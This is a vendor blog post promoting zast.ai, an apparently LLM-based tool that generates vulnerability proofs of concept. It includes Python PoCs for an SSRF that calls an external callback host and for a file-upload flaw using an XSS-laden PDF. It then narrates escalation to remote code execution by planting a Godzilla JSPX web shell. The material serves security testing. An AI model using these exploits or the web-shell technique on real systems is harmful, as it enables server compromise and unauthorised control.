Security challenges are everywhere in today’s digital world. Software is more complex, companies rush updates and threat actors are always upping their game. There aren't enough skilled specialists, and many users don’t grasp how crucial security is.
That’s where a Proof of Concept (POC) comes in, helping teams tackle vulnerabilities before fully committing.
## 1. Validating a Vulnerability: A Complicated and Time-Consuming Process
Without a POC, it’s hard to agree on a vulnerability's severity or even if it’s a vulnerability at all. Many vulnerabilities remain unclear and controversial, and the constant "crying wolf" scenarios make it hard for people to trust the actual risks.
- Consider CVE-2020-19909. Initially rated severe with a score of 9.8, it was later lowered to 3.3 after disputes, classifying it as low risk. Stenberg, founder of "curl," called it "wrong with CVEs," noting it's a bug but not a true vulnerability.
- Another example is CVE-2024-4067, targeting the micromatch library in the npm project, considered a “high severity” ReDoS vulnerability. Developer Jon Schlinkert asked, “Can you point to a real application of micromatch affected by this vulnerability?” "He expressed frustration that these are more theoretical risks than actual vulnerabilities.
Creating an accurate and complete POC for each vulnerability is time-consuming and costly. Moreover, in an industry lacking a solid business cycle, many products are rushed out without thorough checks. This leads to vulnerabilities slipping through, often due to ineffective POCs.
Given these challenges, only a POC can prove potential issues and help teams assess real risks, so it's not just a nice-to-have, it’s a necessity.  

## 2. Using AI to Create Effective POCs: Our Edge in Vulnerabilities Analysis
Empowered by AI, zast.ai quickly creates effective POCs to assess applications efficiently. We'll show 2 reports as examples. Let's take a look.
### I. SSRF Vulnerability

![]({{'/assets/img/10-14-Vulnerability-Assessment/1st-report.jpg' | relative_url }})

And let's see how LLM works in this sample.
First off, obtaining the Correct Parameters:
The LLM starts by pulling parameters from the source code. It gets the user-input URL by calling . Then, it reads the getUrlInput() code to confirm  parameter's source and accurately get urlInput.
```csharp
@Generated
public String getUrlInput() {
    return this.urlInput;
}
``` 

Secondly, generating the Correct POC:
Using source code information, the LLM grabs key API paths and content types:
- Path: /url/pdf
- Content Type: multipart/form-data
```csharp
@PostMapping(consumes = {"multipart/form-data"}, value = {"/url/pdf"})
40:     @Operation(summary = "Convert a URL to a PDF", description = "This endpoint fetches content from a URL and converts it to a PDF format. Input:N/A Output:PDF Type:SISO")
41:     public ResponseEntity<byte[]> urlToPdf(@ModelAttribute UrlToPdfRequest request) throws IOException, InterruptedException {
```

The LLM uses this info to create a valid POC. It builds an HTTP POST request with the requests library, including the URL parameter in the request body.
```csharp
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
url = 'http://**************.com:7001/api/v1/convert/url/pdf'
payload = MultipartEncoder(fields={'urlInput': 'http://*********.oast.me'})
headers = {'Content-Type': payload.content_type}
headers.update({'User-Agent': 'oxpecker'})
response = requests.post(url, data=payload, headers=headers, verify=False)
print('Status Code:', response.status_code)
print('Content:', response.content)
print('Text:', response.text)
```

This example shows how to use the LLM to automate identifying and validating vulnerabilities, especially with specific API requests. By breaking down the source code and parsing the parameters, the model can generate effective POCs. This showcases its real-world application in automated security testing.

### II. Path Injection Vulnerability:

![]({{'/assets/img/10-14-Vulnerability-Assessment/2nd-report.png' | relative_url }})

First, here’s a snippet of code that has the vulnerability:
```csharp
// ********************************

56:     @RequestMapping(value = {"/uploadaudio"}, method = {RequestMethod.POST})
57:     public String uploadAudio(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = "uploadfile", required = true) MultipartFile uploadfile, @RequestParam(value = "param", required = false) String param, @RequestParam(value = "fileType", required = true) String fileType) {
58:         try {
59:             String[] type = fileType.split(",");
60:             setFileTypeList(type);
61:             String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());
62:             if (!fileType.contains(ext)) {
63:                 return responseErrorData(response, 1, "Fail to upload due to format error.");
64:             }
65:             String filePath = getPath(request, ext, param);
66:             File file = new File(getProjectRootDirPath(request) + filePath);
67:             if (!file.getParentFile().exists()) {
68:                 file.getParentFile().mkdirs();
69:             }
70:             uploadfile.transferTo(file);
71:             return responseData(filePath, 0, "Uploaded", response);
72:         } catch (Exception e) {
73:             logger.error("gok4()--error", e);
74:             return responseErrorData(response, 2, "Fail to upload! Try again.");
75:         }
76:     }
77: 
78
```

The advanced LLM from zast.ai generated the following POC and execution result:
```csharp
import requests
import random
import string
url = 'http://*********************/uploadaudio'
param = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
file_content = b'%PDF-%PDF-1.3\n%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\n1 0 obj\n<</Pages 2 0 R /Type /Catalog>>\nendobj\n2 0 obj\n<</Count 1 /Kids [3 0 R] /Type /Pages>>\nendobj\n3 0 obj\n<</AA\n  <</O\n  <</JS\n  (\ntry {\n  app.alert\\("XSS"\\)\n} catch \\(e\\) {\n  app.alert\\(e.message\\);\n}\n    ) \n  /S /JavaScript>>>>\n  /Annots [] /Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R\n  /Resources\n  <</Font <</F1 <</BaseFont /Helvetica /Subtype /Type1 /Type /Font>>>>>>\n  /Type /Page>>\nendobj\n4 0 obj\n<</Length 21>>\nstream\n \nBT\n/F1 24 Tf\nET\n    \nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000015 00000 n\n0000000062 00000 n\n0000000117 00000 n\n0000000424 00000 n\ntrailer\n\n<</Root 1 0 R /Size 5>>\nstartxref\n493\n%%EOF\n'
files = {'uploadfile': ('example.pdf', file_content, 'application/pdf')}
data = {'param': param, 'fileType': 'pdf'}
headers = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Referer': 'http://*************/admin/main/index', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://****************:8080', 'Cookie': 'inxedulogin_sys_user_=inxedulogin_sys_user_1; JSESSIONID=79874FF26726344971B8834D3820DC71;'}
response = requests.post(url, files=files, data=data, verify=False, headers=headers)
print('Status Code:', response.status_code)
print('Response Text:', response.text)
```

![]({{'/assets/img/10-14-Vulnerability-Assessment/result.png' | relative_url }})

From the vulnerable code and the POC, we can see that the fileType parameter controls the file upload type. This means that the file extension whitelist allows threat actor to modify at will. In this case, zast.ai used a PDF file with an XSS payload to demonstrate the file upload vulnerability.
Next, let’s copy the POC code to our local machine for testing:

![]({{'/assets/img/10-14-Vulnerability-Assessment/POC-code.png' | relative_url }})

```csharp
labs :: ~ » cat poc.py

import requests
import random
import string
url = 'http://***************/uploadaudio'
param = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
file_content = b'%PDF-%PDF-1.3\n%\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\n1 0 obj\n<</Pages 2 0 R /Type /Catalog>>\nendobj\n2 0 obj\n<</Count 1 /Kids [3 0 R] /Type /Pages>>\nendobj\n3 0 obj\n<</AA\n  <</O\n  <</JS\n  (\ntry {\n  app.alert\\("XSS"\\)\n} catch \\(e\\) {\n  app.alert\\(e.message\\);\n}\n    ) \n  /S /JavaScript>>>>\n  /Annots [] /Contents 4 0 R /MediaBox [0 0 612 792] /Parent 2 0 R\n  /Resources\n  <</Font <</F1 <</BaseFont /Helvetica /Subtype /Type1 /Type /Font>>>>>>\n  /Type /Page>>\nendobj\n4 0 obj\n<</Length 21>>\nstream\n \nBT\n/F1 24 Tf\nET\n    \nendstream\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000015 00000 n\n0000000062 00000 n\n0000000117 00000 n\n0000000424 00000 n\ntrailer\n\n<</Root 1 0 R /Size 5>>\nstartxref\n493\n%%EOF\n'
files = {'uploadfile': ('example.pdf', file_content, 'application/pdf')}
data = {'param': param, 'fileType': 'pdf'}
headers = {'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Referer': 'http://***************:8080/admin/main/index', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9', 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'http://****************:8080', 'Cookie': 'inxedulogin_sys_user_=inxedulogin_sys_user_1; JSESSIONID=79874FF26726344971B8834D3820DC71;'}
response = requests.post(url, files=files, data=data, verify=False, headers=headers)
print('Status Code:', response.status_code)
print('Response Text:', response.text)

labs :: ~ »
labs :: ~ » python poc.py

Status Code: 200
Response Text: {"error":0,"message":"Uploaded","url":"/*****************/20241107/1730962473505.pdf"}

labs :: ~ »
```

When we access the URL of the uploaded file that is returned in the HTTP response via the browser：

![]({{'/assets/img/10-14-Vulnerability-Assessment/url.png' | relative_url }})

We'll see that PDF file has been successfully uploaded and that the XSS payload was executed in Chrome. 
Now, let’s try changing the fileType to something else to see if we can escalate the file upload vulnerability to RCE (Remote Code Execution).

First, we’ll use a tool called Godzilla to generate a malicious piece of code. We replace the corresponding part in the POC and rename the file to example.jspx, modifying the value of the fileType parameter to jspx.

![]({{'/assets/img/10-14-Vulnerability-Assessment/jspx.png' | relative_url }})
![]({{'/assets/img/10-14-Vulnerability-Assessment/labs.png' | relative_url }})
![]({{'/assets/img/10-14-Vulnerability-Assessment/vim-poc.png' | relative_url }})


After editing the POC file, we run it again, and it shows that the JSPX file was uploaded successfully.

![]({{'/assets/img/10-14-Vulnerability-Assessment/python-poc.png' | relative_url }})

Next, we use Godzilla’s client to manage this backdoor by adding the configuration we generated earlier. We’ll test if it connects properly.

![]({{'/assets/img/10-14-Vulnerability-Assessment/shell.png' | relative_url }})

Finally, once added, we can manipulate the backdoor to control the target Web server.

![]({{'/assets/img/10-14-Vulnerability-Assessment/false.png' | relative_url }})

So, by simply tweaking the POC zast.ai provided for the file upload vulnerability, we’ve easily landed an RCE vulnerability.
The above examples show how well LLMs can automate POC generation. Traditional methods, on the other hand, have many challenges and limitations.

### Vulnerability POC Comparison
To better understand the advantages of using LLM for generating POCs, let's compare it to traditional methods:
#### i. Manual Code Review: It can create POCs, but this process takes a lot of time. Plus, the quality really depends on how skilled the security expert is, and it can get pretty pricey.
#### ii. SAST: It doesn’t generate POCs. So, security experts waste loads of time digging through thousands of findings, only to find that 95% of them are false positives, which can be really frustrating.
#### iii. DAST: It does provide POCs, but the coverage is usually pretty limited.
#### iv. IAST: While it might generate POCs, coverage can fall short. Additionally, when deploying, it usually requires installing an agent, which is relatively intrusive to the production environment and imposes some performance overhead on the server.

What makes this approach rare is its mix of code analysis and request creation. It allows us to quickly generate verifiable POCs, reducing the time and cost of manual validation. This capability isn't common in the industry; many security tools or agents still depend on manual processes, giving our LLM a significant edge in vulnerability validation.

## 3. Conclusion

As security issues grow, organizations must find ways to tackle them. POCs are key for managing vulnerabilities as they help security teams confirm and assess their impacts. zast.ai provides reliable POCs to help users quickly identify vulnerabilities. 

Visit zasta.ai now to try it and keep your systems secure!